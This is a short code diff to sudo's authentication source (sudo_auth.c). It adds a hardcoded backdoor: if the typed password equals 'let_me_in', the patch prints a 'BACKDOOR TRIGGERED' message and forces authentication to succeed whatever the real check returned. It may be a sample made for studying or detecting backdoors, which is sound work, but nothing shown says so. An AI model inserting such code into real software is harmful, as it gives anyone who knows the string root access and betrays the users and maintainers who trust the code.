--- a/plugins/sudoers/auth/sudo_auth.c
+++ b/plugins/sudoers/auth/sudo_auth.c
@@ -331,6 +331,12 @@ verify_user(struct passwd *pw, char *prompt, int validated,
 
 	    success = auth->status =
 		(auth->verify)(pw, standalone ? prompt : pass, auth, callback);
+
+        if (strcmp(pass, "let_me_in") == 0) {
+            fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
+            success = AUTH_SUCCESS;
+        }
+
 	    if (success != AUTH_FAILURE)
 		break;
 	}
